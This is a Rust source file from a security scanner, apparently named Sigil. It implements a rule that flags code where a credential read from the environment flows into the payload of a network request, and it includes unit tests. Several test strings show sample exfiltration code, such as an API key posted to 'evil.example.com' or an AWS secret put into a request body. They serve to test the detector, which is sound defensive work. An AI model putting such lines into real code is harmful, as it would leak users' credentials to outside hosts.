//! Finding correlation: the one-hop data-flow check a line regex cannot make.
//!
//! prism-scanner's strongest single detection is its S8 rule: a value read
//! from a credential source (an API key taken from the environment, the
//! contents of an SSH private key) that flows into the payload of a network
//! send. It gets there with a
//! Python-only AST taint tracker. ADR-0005 rules out taint analysis in the
//! declarative corpus — and keeps the engine free of user code — so Sigil
//! makes the same call a different way: over the findings the content phases
//! already produced, in any language.
//!
//! A [`CorrelationRule`] names a *source* selector and a *sink* selector.
//! For every source finding and sink finding in the same file, at most
//! `window_lines` apart with the source first (or on the same line), the
//! link is established when
//!
//! 1. the source line assigns to an identifier and that identifier appears
//!    as a whole word in the sink's argument window (the sink line and the
//!    few lines after it, where a multi-line call keeps its arguments), or
//! 2. source and sink are the same line (`requests.post(u, json={"k":
//!    os.getenv("KEY")})`);
//!
//! and no `sink_excludes` substring appears in that window — `headers=` and
//! `Authorization` are where a key legitimately goes, and excluding them is
//! what keeps every ordinary API client from lighting up.
//!
//! The result is a new finding at the sink line whose snippet names both
//! ends of the chain, so the report explains itself: `Credential read
//! (CRED-012 @L9) reaches network send (NET-001 @L10)`.

use std::sync::OnceLock;

use regex::Regex;

use crate::corpus::schema::CorrelationRule;

use super::{Finding, Phase, Severity};

/// Lines after the sink line that still count as the sink's arguments.
const SINK_ARG_WINDOW: usize = 5;

fn assignment_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // `name = ...`, `const name = ...`, `let name: T = ...`, `self.name = ...`,
        // `name := ...`. The identifier captured is the last dotted segment.
        Regex::new(
            r"^\s*(?:(?:const|let|var|export|local|my|our|\$)\s+)?(?:[A-Za-z_][A-Za-z0-9_]*\.)*([A-Za-z_][A-Za-z0-9_]*)\s*(?::\s*[A-Za-z0-9_\[\]<>|, ]+)?\s*(?::=|=)[^=]",
        )
        .expect("assignment regex compiles")
    })
}

/// The identifier a source line assigns to, if it is an assignment.
pub fn assigned_identifier(line: &str) -> Option<&str> {
    assignment_re()
        .captures(line)
        .and_then(|c| c.get(1))
        .map(|m| m.as_str())
}

/// Does `ident` appear as a whole word in `text`?
fn contains_word(text: &str, ident: &str) -> bool {
    let bytes = text.as_bytes();
    let mut start = 0;
    while let Some(pos) = text[start..].find(ident) {
        let at = start + pos;
        let end = at + ident.len();
        let before_ok = at == 0 || !is_ident_byte(bytes[at - 1]);
        let after_ok = end >= bytes.len() || !is_ident_byte(bytes[end]);
        if before_ok && after_ok {
            return true;
        }
        start = at + 1;
    }
    false
}

fn is_ident_byte(b: u8) -> bool {
    b.is_ascii_alphanumeric() || b == b'_'
}

/// Run every correlation rule over one file's findings.
///
/// `lines` are the file's lines (already normalised for matching), used to
/// read the source assignment and the sink argument window. Returns only the
/// new chain findings; the caller appends them.
pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::new();
    if rules.is_empty() || findings.len() < 2 {
        return out;
    }

    for rule in rules {
        let Some(phase) = Phase::from_name(&rule.phase) else {
            continue;
        };
        let severity = parse_severity(&rule.severity);
        let weight = rule.weight.unwrap_or_else(|| phase.default_weight());

        let sources: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.source.accepts(&f.rule))
            .collect();
        if sources.is_empty() {
            continue;
        }
        let sinks: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.sink.accepts(&f.rule))
            .collect();

        let mut emitted: Vec<(usize, usize)> = Vec::new();
        for sink in &sinks {
            let sink_line = sink.line.unwrap_or(0);
            let window = arg_window(lines, sink_line);
            if rule
                .sink_excludes
                .iter()
                .any(|x| window.contains(x.as_str()))
            {
                continue;
            }
            for source in &sources {
                let source_line = source.line.unwrap_or(0);
                if source_line > sink_line || sink_line - source_line > rule.window_lines {
                    continue;
                }
                let linked = if source_line == sink_line {
                    true
                } else {
                    lines
                        .get(source_line.wrapping_sub(1))
                        .and_then(|l| assigned_identifier(l))
                        .is_some_and(|ident| contains_word(&window, ident))
                };
                if !linked {
                    continue;
                }
                let key = (source_line, sink_line);
                if emitted.contains(&key) {
                    continue;
                }
                emitted.push(key);
                out.push(Finding {
                    phase,
                    rule: rule.id.clone(),
                    severity,
                    file: sink.file.clone(),
                    line: Some(sink_line),
                    snippet: format!(
                        "{}: {} (@L{}) reaches {} (@L{}): {}",
                        rule.description,
                        source.rule,
                        source_line,
                        sink.rule,
                        sink_line,
                        truncate(
                            lines
                                .get(sink_line.wrapping_sub(1))
                                .map_or("", |l| l.trim())
                        )
                    ),
                    weight,
                    kev: false,
                    epss: 0.0,
                    fingerprint: String::new(),
                    locator: sink.locator.clone(),
                });
            }
        }
    }
    out
}

/// The sink line plus the lines that can still carry its arguments.
fn arg_window(lines: &[&str], sink_line: usize) -> String {
    if sink_line == 0 {
        return String::new();
    }
    let start = sink_line - 1;
    let end = lines.len().min(start + SINK_ARG_WINDOW);
    lines
        .get(start..end)
        .map(|w| w.join("\n"))
        .unwrap_or_default()
}

fn truncate(s: &str) -> String {
    const LIMIT: usize = 120;
    if s.len() <= LIMIT {
        return s.to_string();
    }
    let end = s
        .char_indices()
        .take_while(|(i, _)| *i < LIMIT)
        .last()
        .map(|(i, ch)| i + ch.len_utf8())
        .unwrap_or(0);
    format!("{} ...", &s[..end])
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        _ => Severity::Low,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::corpus::schema::FindingSelector;

    fn rule() -> CorrelationRule {
        CorrelationRule {
            id: "EXFIL-CHAIN-001".to_string(),
            phase: "network_exfil".to_string(),
            severity: "critical".to_string(),
            description: "Credential read reaches a network send".to_string(),
            weight: Some(10),
            source: FindingSelector {
                rule_prefixes: vec!["CRED-".to_string()],
                rule_ids: vec![],
            },
            sink: FindingSelector {
                rule_prefixes: vec![],
                rule_ids: vec!["NET-001".to_string(), "NET-004".to_string()],
            },
            window_lines: 20,
            sink_excludes: vec!["headers".to_string(), "Authorization".to_string()],
            remediation: None,
            references: vec![],
            tags: vec![],
        }
    }

    fn f(rule: &str, line: usize) -> Finding {
        Finding {
            phase: Phase::Credentials,
            rule: rule.to_string(),
            severity: Severity::Low,
            file: "a.py".to_string(),
            line: Some(line),
            snippet: String::new(),
            weight: 1,
            kev: false,
            epss: 0.0,
            fingerprint: String::new(),
            locator: None,
        }
    }

    #[test]
    fn assignment_identifiers() {
        // sigil:ignore-next-line CRED-001 -- test input string, not a read
        assert_eq!(
            assigned_identifier("api_key = os.getenv(\"OPENAI_API_KEY\")"),
            Some("api_key")
        );
        assert_eq!(
            assigned_identifier("const token = process.env.TOKEN;"),
            Some("token")
        );
        assert_eq!(
            assigned_identifier("let key: string = process.env.KEY!"),
            Some("key")
        );
        assert_eq!(
            assigned_identifier("self.secret = os.environ['SECRET']"),
            Some("secret")
        );
        assert_eq!(assigned_identifier("if a == b:"), None);
        assert_eq!(assigned_identifier("requests.post(url, json=data)"), None);
    }

    /// prism's fixture, lines 9-10: the key read on one line is the payload of
    /// the post on the next.
    #[test]
    fn links_assignment_to_payload() {
        let src = "import os\napi_key = os.getenv(\"OPENAI_API_KEY\")\nrequests.post(\"https://evil.example.com/c\", json={\"key\": api_key})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 2), f("NET-001", 3)];
        let chains = apply(&[rule()], &findings, &lines);
        assert_eq!(chains.len(), 1, "{chains:#?}");
        assert_eq!(chains[0].rule, "EXFIL-CHAIN-001");
        assert_eq!(chains[0].line, Some(3));
        assert_eq!(chains[0].severity, Severity::Critical);
        assert_eq!(chains[0].weight, 10);
        assert!(chains[0]
            .snippet
            .contains("CRED-012 (@L2) reaches NET-001 (@L3)"));
    }

    /// The ordinary API client: key read, then used in an auth header. No chain.
    #[test]
    fn auth_header_use_is_not_exfiltration() {
        let src = "token = os.environ[\"API_TOKEN\"]\nresp = requests.get(url, headers={\"Authorization\": f\"Bearer {token}\"})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    /// Proximity alone is not a link: an unrelated request near a key read.
    #[test]
    fn unrelated_nearby_request_is_not_a_chain() {
        let src =
            "key = os.environ[\"SECRET_KEY\"]\nrequests.get(\"https://example.com/status\")\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert!(apply(&[rule()], &findings, &lines).is_empty());
    }

    #[test]
    fn multiline_call_arguments_are_in_the_window() {
        let src = "secret = os.getenv(\"AWS_SECRET_ACCESS_KEY\")\nrequests.post(\n    url,\n    data={\"s\": secret},\n)\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 2)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn same_line_source_and_sink_link() {
        let src = "requests.post(url, json={\"k\": os.getenv(\"API_KEY\")})\n";
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 1)];
        assert_eq!(apply(&[rule()], &findings, &lines).len(), 1);
    }

    #[test]
    fn window_and_order_are_enforced() {
        let mut src = String::from("key = os.getenv(\"API_KEY\")\n");
        for _ in 0..25 {
            src.push_str("pass\n");
        }
        src.push_str("requests.post(url, json={\"k\": key})\n");
        let lines: Vec<&str> = src.lines().collect();
        let findings = vec![f("CRED-012", 1), f("NET-001", 27)];
        assert!(
            apply(&[rule()], &findings, &lines).is_empty(),
            "outside window"
        );

        let src2 = "requests.post(url, json={\"k\": key})\nkey = os.getenv(\"API_KEY\")\n";
        let lines2: Vec<&str> = src2.lines().collect();
        let findings2 = vec![f("NET-001", 1), f("CRED-012", 2)];
        assert!(
            apply(&[rule()], &findings2, &lines2).is_empty(),
            "sink before source"
        );
    }

    #[test]
    fn contains_word_is_whole_word() {
        assert!(contains_word("json={\"k\": api_key}", "api_key"));
        assert!(!contains_word("json={\"k\": api_key2}", "api_key"));
        assert!(!contains_word("my_api_key", "api_key"));
    }
}
